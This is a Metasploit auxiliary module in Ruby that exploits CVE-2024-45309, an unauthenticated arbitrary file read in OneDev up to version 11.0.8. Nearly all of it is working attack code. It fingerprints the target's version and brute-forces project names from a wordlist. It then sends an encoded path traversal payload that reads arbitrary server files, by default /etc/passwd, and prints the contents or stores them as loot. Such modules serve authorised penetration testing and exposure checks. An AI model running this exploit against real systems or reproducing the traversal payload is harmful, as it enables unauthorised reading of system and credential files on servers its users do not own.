##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  prepend Msf::Exploit::Remote::AutoCheck
  CheckCode = Exploit::CheckCode

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'OneDev Unauthenticated Arbitrary File Read',
        'Description' => %q{
          This module exploits an unauthenticated arbitrary file read vulnerability (CVE-2024-45309), which affects OneDev versions <= 11.0.8.
          To exploit this vulnerability, a valid OneDev project name is required. If anonymous access is enabled on the OneDev server, any visitor
          can view existing projects without authentication.
          However, when anonymous access is disabled, an attacker who lacks prior knowledge of existing project names can use a brute-force approach.
          By providing a user-supplied wordlist, the module may be able to guess a valid project name and subsequently exploit the vulnerability.
        },
        'Author' => [
          'vultza', # metasploit module
          'Siebene' # vuln discovery
        ],
        'License' => MSF_LICENSE,
        'References' => [
          ['CVE', '2024-45309'],
          ['GHSA', '7wg5-6864-v489', 'theonedev/onedev']
        ],
        'DisclosureDate' => '2024-10-19',
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [],
          'SideEffects' => [IOC_IN_LOGS]
        }
      )
    )
    register_options(
      [
        OptString.new('TARGETURI', [true, 'The relative URI of the OneDev instance', '/']),
        OptString.new('TARGETFILE', [true, 'The absolute file path to read', '/etc/passwd']),
        OptBool.new('STORE_LOOT', [true, 'Store the target file as loot', false]),
        OptString.new('PROJECT_NAME', [false, 'The target OneDev project name', '']),
        OptPath.new('PROJECT_NAMES_FILE', [
          false, 'File containing project names to try, one per line',
          File.join(Msf::Config.data_directory, 'wordlists', 'namelist.txt')
        ])
      ]
    )
  end

  def check
    res = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path)
    })

    return Exploit::CheckCode::Unknown('Request failed') unless res
    return Exploit::CheckCode::Unknown("Landing page request returned HTTP #{res.code}.") unless res.code == 200

    body = res.body.to_s
    unless ['OneDev', "var redirect = '/~login';"].any? { |f| body.include? f }
      return Exploit::CheckCode::Unknown("The target isn't a OneDev instance.")
    end

    version = body[/OneDev (\d+(?:\.\d+)+)\b/, 1]

    if version.nil?
      project = resolve_project
      return Exploit::CheckCode::Unknown('No valid OneDev project was found to check the file read.') unless project

      res = read_file(project, '/etc/passwd')
      if file_response?(res) && res.body.include?('root:x:0:0:root:')
        return Exploit::CheckCode::Vulnerable('OneDev instance is vulnerable.')
      end

      return Exploit::CheckCode::Unknown('The OneDev version is hidden and the file read could not be confirmed.')
    end

    version = Rex::Version.new(version)

    return Exploit::CheckCode::Safe("OneDev #{version} is not vulnerable.") if version > Rex::Version.new('11.0.8')

    Exploit::CheckCode::Appears("OneDev #{version} is vulnerable.")
  rescue Msf::OptionValidateError => e
    Exploit::CheckCode::Unknown(e.message)
  rescue Rex::ConnectionError, Rex::TimeoutError, ::Timeout::Error => e
    elog('OneDev vulnerability check request failed', error: e)
    Exploit::CheckCode::Unknown('OneDev vulnerability check request failed.')
  end

  def validate_project_exists(project)
    res = send_request_cgi({
      'method' => 'HEAD',
      'uri' => normalize_uri(target_uri.path, project, '~site')
    })

    return res&.code == 200
  end

  def find_project
    print_status 'Bruteforcing a valid project name…'

    File.open(datastore['PROJECT_NAMES_FILE'].to_s, 'rb') do |wordlist|
      wordlist.each_line do |project|
        project = project.strip
        next if project.empty? || !validate_project_exists(project)

        print_status("#{peer} - Found valid OneDev project name: #{project}")
        return project
      end
    end
    nil
  rescue Errno::ENOENT, Errno::EACCES, Errno::EPERM, Errno::EISDIR, Errno::ENOTDIR, IOError => e
    elog('Reading the OneDev project names wordlist failed', error: e)
    raise Msf::OptionValidateError.new(['PROJECT_NAMES_FILE'], message: 'Unable to read the project names wordlist. Set PROJECT_NAMES_FILE to a readable file.')
  end

  def resolve_project
    project = datastore['PROJECT_NAME'].to_s.strip
    return find_project if project.empty?

    project if validate_project_exists(project)
  end

  def file_response?(res)
    # SiteFileResource sets a filename only for real files. Its missing-file response
    # can also return HTTP 200, and directory redirects are HTML with HTTP 200.
    res&.code == 200 && res.body.is_a?(String) && res.headers['Content-Disposition'].to_s.match?(/(?:\A|;)\s*filename(?:\*)?\s*=\s*(?:"[^"]+"|[^;\s"]+)\s*(?:;|\z)/i)
  end

  def read_file(project_name, target_file)
    path_traversal = '~site////////%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e'
    payload_path = normalize_uri(target_uri.path, project_name)
    payload_path = "#{payload_path}/#{path_traversal}#{target_file}"

    res = send_request_cgi({
      'method' => 'GET',
      'uri' => payload_path
    })
    return res
  end

  def run
    project_name = resolve_project
    fail_with(Failure::NoTarget, 'No valid OneDev project was found. Check PROJECT_NAME or PROJECT_NAMES_FILE.') unless project_name

    res = read_file(project_name, datastore['TARGETFILE'])

    fail_with(Failure::Unreachable, 'Request timed out.') unless res
    fail_with(Failure::UnexpectedReply, "File read request returned HTTP #{res.code}.") unless res.code == 200
    fail_with(Failure::UnexpectedReply, "Target did not return a file response for #{datastore['TARGETFILE']}.") unless file_response?(res)

    file_name = datastore['TARGETFILE']
    if datastore['STORE_LOOT']
      store_loot(File.basename(file_name), 'text/plain', datastore['RHOST'], res.body, file_name, 'File retrieved from OneDev server')
      print_good("#{file_name} file stored in loot.")
    else
      print_good("#{file_name} file retrieved with success.\n#{res.body}")
    end
  rescue Msf::OptionValidateError => e
    fail_with(Failure::BadConfig, e.message)
  rescue Rex::ConnectionError, Rex::TimeoutError, ::Timeout::Error => e
    elog('OneDev file read request failed', error: e)
    fail_with(Failure::Unreachable, 'OneDev file read request failed.')
  end
end
